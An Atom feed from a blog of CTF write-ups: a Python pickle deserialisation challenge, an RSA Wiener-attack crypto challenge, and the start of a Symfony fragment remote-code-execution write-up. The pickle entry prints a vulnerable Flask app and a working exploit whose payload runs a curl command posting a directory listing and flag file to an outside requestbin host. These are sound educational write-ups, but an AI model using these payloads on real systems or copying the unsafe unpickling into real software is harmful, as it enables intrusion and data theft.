<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>domyos writeups</title><link href="https://domyos.github.io/" rel="alternate"></link><link href="https://domyos.github.io/feeds/all.atom.xml" rel="self"></link><id>https://domyos.github.io/</id><updated>2022-03-14T00:00:00+01:00</updated><entry><title>Imported Kimchi</title><link href="https://domyos.github.io/imported-kimchi.html" rel="alternate"></link><published>2022-03-14T00:00:00+01:00</published><updated>2022-03-14T00:00:00+01:00</updated><author><name>domyos</name></author><id>tag:domyos.github.io,2022-03-14:/imported-kimchi.html</id><summary type="html">&lt;h1&gt;Imported kimchi&lt;/h1&gt;
&lt;p&gt;Even though I did not have the time to redeem the flag while the CTF was running I wanted to do a quick writeup since I haven't played with Pythons &lt;code&gt;pickle&lt;/code&gt; module before.&lt;/p&gt;
&lt;p&gt;The challenge was available under &lt;a href="https://imported-kimchi.cha.hackpack.club/"&gt;https://imported-kimchi.cha.hackpack.club/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="challenge landing page" src="https://domyos.github.io/images/landing_page.png"&gt;&lt;/p&gt;
&lt;p&gt;On the site a user …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Imported kimchi&lt;/h1&gt;
&lt;p&gt;Even though I did not have the time to redeem the flag while the CTF was running I wanted to do a quick writeup since I haven't played with Pythons &lt;code&gt;pickle&lt;/code&gt; module before.&lt;/p&gt;
&lt;p&gt;The challenge was available under &lt;a href="https://imported-kimchi.cha.hackpack.club/"&gt;https://imported-kimchi.cha.hackpack.club/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="challenge landing page" src="https://domyos.github.io/images/landing_page.png"&gt;&lt;/p&gt;
&lt;p&gt;On the site a user can upload images which are then available under &lt;a href="https://imported-kimchi.cha.hackpack.club/images/"&gt;https://imported-kimchi.cha.hackpack.club/images/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="upload page" src="https://domyos.github.io/images/upload.png"&gt;&lt;/p&gt;
&lt;p&gt;The source code of the flask app was provided:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;uuid&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask_bootstrap&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Bootstrap&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pickle&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Flask&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;Bootstrap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;secret_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sup3r s3cr3t k3y&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;ALLOWED_EXTENSIONS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jpg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jpeg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

&lt;span class="n"&gt;images&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;images&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bibimbap.jpg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;images&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;galbi.jpg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;images&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;pickled_kimchi.jpg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nd"&gt;@app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;index&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;render_template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;images&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;images&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nd"&gt;@app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/upload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;methods&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;upload&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;ALLOWED_EXTENSIONS&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="c1"&gt;# special file names are fun!&lt;/span&gt;
            &lt;span class="n"&gt;extension&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;fancy_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uuid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uuid4&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;extension&lt;/span&gt;

            &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./images&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fancy_name&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
            &lt;span class="n"&gt;flash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Successfully uploaded image! View it at /images/&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;fancy_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;success&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;redirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url_for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;upload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;flash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;An error occured while uploading the image! Support filetypes are: png, jpg, jpeg&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;danger&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;redirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url_for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;upload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;render_template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;upload.html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nd"&gt;@app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/images/&amp;lt;filename&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;display_image&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./images/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;send_from_directory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./images&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The problems seems to be with the use of pythons &lt;code&gt;pickle&lt;/code&gt; module.
David Hamann wrote a &lt;a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/"&gt;blog post&lt;/a&gt; about the issue with unpickling untrusted user input.&lt;/p&gt;
&lt;p&gt;In a similar fashion we can create a python script that creates a file that when unpickled reads the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pickle&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Exploit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__reduce__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;curl https://requestbin.io/1bmggxr1 -X POST -d &amp;quot;$(ls -la; cat flag.txt)&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,))&lt;/span&gt;

&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pickle&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dumps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exploit&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;images/asdf.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w+b&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytearray&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The python script uses the &lt;code&gt;pickle.dumps&lt;/code&gt; function to create a pickled object of type &lt;code&gt;Exploit&lt;/code&gt;.
This class implements the &lt;code&gt;__reduce__&lt;/code&gt; function that is called when the object is unpickled.
During unpickling this function uses &lt;code&gt;os.system&lt;/code&gt; to read the contents of the current directory, as well as the flag and sends it via an HTTP POST request to a requestbin that can be easily created on &lt;a href="https://requestbin.io"&gt;https://requestbin.io&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="screenshot requestbin" src="https://domyos.github.io/images/requestbin.png"&gt;&lt;/p&gt;</content><category term="CTF writeups"></category><category term="web"></category></entry><entry><title>Small weiner writeup</title><link href="https://domyos.github.io/small-weiner-writeup.html" rel="alternate"></link><published>2022-03-14T00:00:00+01:00</published><updated>2022-03-14T00:00:00+01:00</updated><author><name>domyos</name></author><id>tag:domyos.github.io,2022-03-14:/small-weiner-writeup.html</id><summary type="html">&lt;h1&gt;Cryptography&lt;/h1&gt;
&lt;h2&gt;small weiner&lt;/h2&gt;
&lt;p&gt;&lt;img width="506" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158152121-365835bd-db30-4d05-b63c-65197af06b7c.png"&gt;&lt;/p&gt;
&lt;p&gt;To begin we start by search for ways to attack RSA. With some search engine magic we find the &lt;a href="https://www.utc.edu/sites/default/files/2021-04/course-paper-5600-rsa.pdf"&gt;following article&lt;/a&gt;.
This mentions an attack on low private exponents. By coincidence this attack on small ds was initially described M. Wiener, which perfectly matches the challenge name …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Cryptography&lt;/h1&gt;
&lt;h2&gt;small weiner&lt;/h2&gt;
&lt;p&gt;&lt;img width="506" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158152121-365835bd-db30-4d05-b63c-65197af06b7c.png"&gt;&lt;/p&gt;
&lt;p&gt;To begin we start by search for ways to attack RSA. With some search engine magic we find the &lt;a href="https://www.utc.edu/sites/default/files/2021-04/course-paper-5600-rsa.pdf"&gt;following article&lt;/a&gt;.
This mentions an attack on low private exponents. By coincidence this attack on small ds was initially described M. Wiener, which perfectly matches the challenge name.&lt;/p&gt;
&lt;p&gt;When trying to understand the attack I also found the following papers which are an interesting read:&lt;/p&gt;
&lt;p&gt;https://repository.root-me.org/Cryptographie/EN%20-%20Partial%20Key%20Exposure%20AttackOn%20Low-Exponent%20RSA%20-%20Eric%20W%20Everstine.pdf&lt;/p&gt;
&lt;p&gt;https://www.cits.ruhr-uni-bochum.de/imperia/md/content/may/krypto2ss08/shortsecretexponents.pdf&lt;/p&gt;
&lt;p&gt;And there exists also the following video by Jeff Suzuki on YouTube where he describes how Wieners attack works:
https://www.youtube.com/watch?v=OpPrrndyYNU&lt;/p&gt;
&lt;p&gt;Since I didn't want to implement the attack myself I googled a little further and found the &lt;a href="https://github.com/sourcekris/goRsaTool"&gt;goRsaTool&lt;/a&gt; on GitHub.
This tool can execute Wieners attack.&lt;/p&gt;
&lt;p&gt;I then simply created a file &lt;code&gt;numbers.txt&lt;/code&gt; that contains N and e from the challenge description.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# cat numbers.txt&lt;/span&gt;
&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x26553fbb7e4bd5bd48868a25f24d9cc5975aa8597f82110058e687dfa10dd0114c0d2011fa288dbd9d01c0a70dfa8212d5a218d513bdd8ebed9f75bc299e1461be8a23ed8ade96bc449d409fbbf5a328ee2ad3257e6c55a97641258730f74f4d3938f0df794546791ba2b1518b8d855e83f65f885d67aa000a01687ac605404e7bca681e51e6e195f77eb4785fcda0372e3d0fd90240f736243584677f89da4c6ab54d687897d5afb0801cc151c516b072aaa2d9aa8d39d34c230536cba077beaa88ff8e8940a5ba990cafd0b1326f209873a43a785d0c5477241fb6469b8c27c7d54908467a7525de18b2425901c0de3ed63472831c29818ce6efb0354c61f36b2e61146472e99209d198bc885ced0edb66eab62a968c9b98b49b756c689d69820ca1d97e1232c338084097078265ce79b25c1e37bc777247af3fee2ce7a87a697a120c0428327177cf6e934aa2d18e696474227d361a5c36992788c3b1aa8654b88852e897027d58b21576b25a5ffdcb9fbdc5167eb74f1c9082ae79ca0b89&lt;/span&gt;
&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xfc2e4d12eb69a42c074d9a0ddc6b84294f1e23d6eaa0ba53e9cb60ec0db203d31bdfb90eaca38189890ad26335ad6107cd234a415bfc73fc1bbd6c5d9da65249eebb57d889f91719cfdbd535ab19d2d317ffdf075870a62c6e05aac16c9b122e1c52d7dbeb2fb683514d0f463b58a4217f2e379e5a62be06e764e043a0eac5ac6af56816af926bcc4cd826ee1cfd4157496dc024042676503cec93de45c3c5e4dd9dcf85406a3cf93a9f784b9eef6e320cd9856aefff48df52127b98da8a0d207f588ce1c58e47419554590b1fa7fa3c38034f93a3a5112b6dd5e78c181abc2d972fbcb058575789c68c03f043bd4bf48d94fa7390c77f9fc033f3f01a5162d31056eb42a07397f3485b25396f93558466fc49ef80adea1e9d6c3d9edf529be5faf014669ae5f8e02433a2474d9c92fcc468d81aa0fd641a5647d55153713783a9e5d66fe70c9c2794325b28f20b751fb49359c4a8487bbfa7efc6270b7fa0ffe277276bba14027596d129fcbdef0a82aba24855bfd2155071b52c11da2d943&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then I run &lt;code&gt;./gorsatool -key numbers.txt -attack wiener -verbose&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="image" src="https://user-images.githubusercontent.com/3590155/158155106-d85a90cc-91b8-41ac-8273-fb4e2441954f.png"&gt;&lt;/p&gt;
&lt;p&gt;This seemed to work but the output doesn't match the required d in base10.
So add the line &lt;code&gt;log.Printf("found the d: %s", c[1])&lt;/code&gt; to output the value of d.&lt;/p&gt;
&lt;p&gt;&lt;img alt="image" src="https://user-images.githubusercontent.com/3590155/158157020-c810e966-ff13-4f86-8139-70665aed84a2.png"&gt;&lt;/p&gt;
&lt;p&gt;This results in the following output:
&lt;img alt="image" src="https://user-images.githubusercontent.com/3590155/158157152-3f8c5db5-80d5-40df-8e7c-d061a861cf09.png"&gt;&lt;/p&gt;
&lt;p&gt;So the flag is &lt;code&gt;dvCTF{79070855007994582698354011721316587208400326157509581241514418985973605934731}&lt;/code&gt;&lt;/p&gt;</content><category term="CTF writeups"></category><category term="cryptography"></category></entry><entry><title>Symphony writeup</title><link href="https://domyos.github.io/symphony-writeup.html" rel="alternate"></link><published>2022-03-14T00:00:00+01:00</published><updated>2022-03-14T00:00:00+01:00</updated><author><name>domyos</name></author><id>tag:domyos.github.io,2022-03-14:/symphony-writeup.html</id><summary type="html">&lt;h1&gt;Web&lt;/h1&gt;
&lt;h2&gt;🎵&lt;/h2&gt;
&lt;p&gt;&lt;img width="511" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158144742-a5ee9ca5-3395-46ad-a76b-9ffcc88a336c.png"&gt;&lt;/p&gt;
&lt;p&gt;If we inspect the website at the given link we can see that is displays the output of &lt;code&gt;phpinfo()&lt;/code&gt;
&lt;img width="946" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158144934-bd4d0957-f59b-494f-bfee-577d978ff592.png"&gt;&lt;/p&gt;
&lt;p&gt;Further down in the page we see two interesting environment variables &lt;code&gt;APP_SECRET&lt;/code&gt; and &lt;code&gt;SYMFONY_DOTENV_VARS&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img width="946" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158145144-7bb1c71a-7370-4bb3-9ae8-1d01eceeb49f.png"&gt;&lt;/p&gt;
&lt;p&gt;This indicated that the page is built with &lt;a href="https://symfony.com/"&gt;Symphony&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;After some googling I …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Web&lt;/h1&gt;
&lt;h2&gt;🎵&lt;/h2&gt;
&lt;p&gt;&lt;img width="511" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158144742-a5ee9ca5-3395-46ad-a76b-9ffcc88a336c.png"&gt;&lt;/p&gt;
&lt;p&gt;If we inspect the website at the given link we can see that is displays the output of &lt;code&gt;phpinfo()&lt;/code&gt;
&lt;img width="946" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158144934-bd4d0957-f59b-494f-bfee-577d978ff592.png"&gt;&lt;/p&gt;
&lt;p&gt;Further down in the page we see two interesting environment variables &lt;code&gt;APP_SECRET&lt;/code&gt; and &lt;code&gt;SYMFONY_DOTENV_VARS&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img width="946" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158145144-7bb1c71a-7370-4bb3-9ae8-1d01eceeb49f.png"&gt;&lt;/p&gt;
&lt;p&gt;This indicated that the page is built with &lt;a href="https://symfony.com/"&gt;Symphony&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;After some googling I found the following &lt;a href="https://www.ambionics.io/blog/symfony-secret-fragment"&gt;blog post&lt;/a&gt; that describes a way to gain remote code execution in Symphony based websites.&lt;/p&gt;
&lt;h3&gt;Testing for vulnerability&lt;/h3&gt;
&lt;p&gt;To test whether we can apply this exploit or not we open http://challs.dvc.tf:9000/_fragment which returns the expected HTTP 403.&lt;/p&gt;
&lt;p&gt;&lt;img width="623" alt="grafik" src="https://user-images.githubusercontent.com/3590155/158145976-0680863a-ce43-4aa1-b66b-fb789bac20b6.png"&gt;&lt;/p&gt;
&lt;h3&gt;Calculate valid signature&lt;/h3&gt;
&lt;p&gt;As described in the blog post we calculate the proper HMAC with the exposed &lt;code&gt;APP_SECRET&lt;/code&gt; and the URL we want to access:&lt;/p&gt;
